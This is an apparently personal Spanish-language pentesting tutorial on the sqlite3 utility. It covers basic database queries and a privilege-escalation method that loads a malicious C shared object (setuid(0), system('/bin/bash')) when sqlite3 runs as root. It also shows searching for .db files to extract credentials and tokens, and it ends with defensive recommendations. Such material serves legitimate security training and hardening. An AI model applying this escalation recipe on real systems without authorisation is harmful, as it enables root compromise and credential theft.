
---
# Herramienta: Sqlite3

## Introducción

SQLite es una base de datos relacional ligera que no requiere servidor, ampliamente utilizada en sistemas embebidos, escritorios y aplicaciones móviles. La utilidad `sqlite3` permite interactuar directamente con archivos `.db` desde la línea de comandos.

En entornos de pruebas de penetración, SQLite puede ser relevante cuando encontramos bases de datos locales accesibles (por permisos inseguros) o incluso cuando el binario de `sqlite3` tiene permisos SUID o puede ser ejecutado con privilegios elevados mediante `sudo`.

---

## Objetivo

Comprender el uso de la utilidad `sqlite3`, cómo manipular bases de datos locales, y cómo abusar del binario para escalar privilegios cuando es posible ejecutarlo con permisos elevados.

---

## Enumeración y contexto

Acciones comunes para identificar posibles vectores de ataque:

```bash
which sqlite3
ls -l $(which sqlite3)
sudo -l
````

- Si el binario `sqlite3` tiene permisos SUID o puede ejecutarse como root, se puede intentar abusar de su capacidad de ejecución de código externo vía funciones definidas en C o carga de extensiones.
    

---

## Uso básico de SQLite3

### Ver contenido de una base de datos

```bash
sqlite3 archivo.db
```

Una vez dentro del prompt:

```sql
.tables         -- lista las tablas
.schema         -- muestra la estructura de las tablas
SELECT * FROM usuarios;  -- consulta básica
.quit           -- salir
```

---

## Escalada de privilegios con `sqlite3`

Si `sqlite3` puede ejecutarse como root, existen varios métodos de explotación. Uno de los más conocidos es abusar de la carga de extensiones compartidas (`.so`) maliciosas escritas en C.

---

### Método 1: Cargar una extensión maliciosa

**1. Escribir un archivo en C para obtener una shell:**

```c
// shell.c
#include <stdlib.h>
void _init() {
  setuid(0);
  setgid(0);
  system("/bin/bash");
}
```

**2. Compilarlo:**

```bash
gcc -fPIC -shared -o shell.so shell.c
```

**3. Cargarlo desde sqlite3:**

```bash
sqlite3
sqlite> .load ./shell.so
```

**Resultado:** se abre una shell como root (si el binario se ejecuta con privilegios).

---

### Método 2: Ejecutar comandos arbitrarios si la función `load_extension` está habilitada

Algunas compilaciones permiten ejecutar código externo usando extensiones o funciones definidas.

---

## SQLite3 como vector de acceso a información sensible

Si encontramos archivos `.db` con contenido interesante:

```bash
find / -name "*.db" 2>/dev/null
```

Y luego:

```bash
sqlite3 archivo.db
.tables
SELECT * FROM nombre_tabla;
```

Esto puede revelar:

- Credenciales en texto plano o hasheadas.
    
- Configuraciones de servicios.
    
- Tokens de autenticación o sesiones.
    

---

## Recomendaciones defensivas

- Evitar que el binario `sqlite3` tenga permisos SUID.
    
- Evitar configuraciones `sudo` que permitan su ejecución por usuarios no privilegiados.
    
- Revisar periódicamente los permisos de archivos `.db` críticos.
    
- Cifrar los datos sensibles dentro de bases de datos SQLite cuando sea viable.
    

---

## Referencias

- [SQLite3 - Sitio oficial](https://sqlite.org/)
    
- [GTFOBins - Sqlite3](https://gtfobins.github.io/gtfobins/sqlite3/)
    

---

Este documento ha mostrado cómo utilizar `sqlite3` de forma básica para el análisis de bases de datos, así como cómo su abuso puede llevar a una escalada de privilegios en ciertos escenarios mal configurados.

